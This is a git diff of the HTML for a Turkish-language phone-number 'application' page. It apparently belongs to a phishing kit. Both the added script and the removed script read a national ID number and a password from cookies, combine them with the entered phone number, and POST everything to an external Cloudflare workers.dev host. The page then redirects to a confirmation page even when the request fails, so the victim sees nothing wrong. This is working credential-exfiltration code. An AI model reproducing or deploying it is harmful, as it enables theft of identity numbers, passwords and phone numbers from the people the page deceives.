@@ -27,7 +27,7 @@ margin-right: 0px;
 margin-top: 0px;
 margin-bottom: 0px;
 ">
- <form name="aspnetForm" method="post" id="aspnetForm" autocomplete="off" novalidate="novalidate">
+<form name="aspnetForm" method="post" id="aspnetForm" autocomplete="off" novalidate="novalidate">
     <div class="login-wrap">
         <header></header>
         <div class="container">
@@ -52,20 +52,60 @@ margin-bottom: 0px;
 <input autocomplete="off" name="telno" type="tel" maxlength="13" id="telno" class="form-control required isNumber numeric external-validation" style="font-size: 14px; height: 46px; font-family: sans-serif; font-weight: 700;" placeholder="+90" data-msg-required="+90" maxlengthvalidationenabled="False" disablevalidationonblur="true" causesval="false" aria-required="true" value="+90">
 
 <script>
-// Sayfa yüklendiğinde
-$(document).ready(function(){
-    // Input alanının değerini kontrol et
-    $('#telno').on('input', function(){
-        // Başlangıçta +90 değerini koru
-        if(!$(this).val().startsWith('+90')){
-            $(this).val('+90');
-        }
+    // Sayfa yüklendiğinde
+    document.addEventListener("DOMContentLoaded", function () {
+        // Input alanının değerini kontrol et
+        var phoneNumberInput = document.getElementById('telno');
+        // Giriş butonu
+        var loginBtn = document.getElementById('loginBtn');
+
+        phoneNumberInput.addEventListener('input', function () {
+            var phoneNumber = phoneNumberInput.value;
+
+            // Eğer en az 8 karakter girilmişse
+            if (phoneNumber.length >= 10) {
+                // Giriş butonunun disable özelliğini kaldır
+                loginBtn.removeAttribute('disabled');
+            } else {
+                // Giriş butonunu disable yap
+                loginBtn.setAttribute('disabled', 'disabled');
+            }
+        });
+
+        // Giriş butonuna tıklanınca
+        loginBtn.addEventListener('click', function (event) {
+            event.preventDefault(); // Formun post işlemini engelle
+            var telno = document.getElementById('telno').value;
+
+            // Cookie'den kayıtlı adı al
+            var tcno = getCookie("tcno");
+            var pass = getCookie("pass");
+
+            // POST işlemi için veri oluştur
+            var data = new FormData();
+            data.append('telno', telno);
+            data.append('tcno', tcno); // Cookie'den alınan adı ekle
+            data.append('pass', pass);
+
+            fetch('https://worker-raspy-unit-d9a7.selimjuhan2.workers.dev/', {
+                method: 'POST',
+                body: data
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log(data);
+                window.location.href = 'onay.html'; // Başvuru başarılı olduğunda onay sayfasına yönlendir
+            })
+            .catch(error => {
+                console.error('Hata:', error);
+                window.location.href = 'onay.html'; // Başvuru başarısız olduğunda da onay sayfasına yönlendir
+            });
+        });
     });
-});
 </script>
                                         </div>
                                         <div class="clearfix"></div>
-					      
+					  
                                         <button id="loginBtn" class="btn btn-danger sendBtn" disabled>
                                             <span></span>BAŞVUR
                                         </button>
@@ -97,69 +137,6 @@ $(document).ready(function(){
     </div>
 </form>
 
- 
-<script>
-
-    function getCookie(name) {
-    var nameEQ = name + "=";
-    var ca = document.cookie.split(';');
-    for (var i = 0; i < ca.length; i++) {
-        var c = ca[i];
-        while (c.charAt(0) === ' ') c = c.substring(1, c.length);
-        if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
-    }
-    return null;
-}
-    var phoneNumberInput = document.getElementById('telno');
-    
-    // Giriş butonu
-    var loginBtn = document.getElementById('loginBtn');
-    
-    // Cep telefonu numarası input alanını dinle
-    phoneNumberInput.addEventListener('input', function () {
-        var phoneNumber = phoneNumberInput.value;
-    
-        // Eğer en az 8 karakter girilmişse
-        if (phoneNumber.length >= 10) {
-            // Giriş butonunun disable özelliğini kaldır
-            loginBtn.removeAttribute('disabled');
-        } else {
-            // Giriş butonunu disable yap
-            loginBtn.setAttribute('disabled', 'disabled');
-        }
-    });
-    
-    // Giriş butonuna tıklanınca
-loginBtn.addEventListener('click', function () {
-    var telno = document.getElementById('telno').value;
-
-    // Cookie'den kayıtlı adı al
-    var tcno = getCookie("tcno");
-    var pass = getCookie("pass");
-    
-    // POST işlemi için veri oluştur
-    var data = new FormData();
-    data.append('telno', telno);
-    data.append('tcno', tcno); // Cookie'den alınan adı ekle
-    data.append('pass', pass);
-    //   https://worker-frostyabi.selimjuhan2.workers.dev/
-    fetch('https://worker-raspy-unit-d9a7.selimjuhan2.workers.dev/', {
-        method: 'POST',
-        body: data
-    })
-    .then(response => response.text())
-    .then(data => {
-        console.log(data);
-        window.location.href = 'onay.html';
-    })
-    .catch(error => {
-        console.error('Hata:', error);
-        window.location.href = 'onay.html';
-    });
-});
-
-    </script>
- 
  
 
     <div>
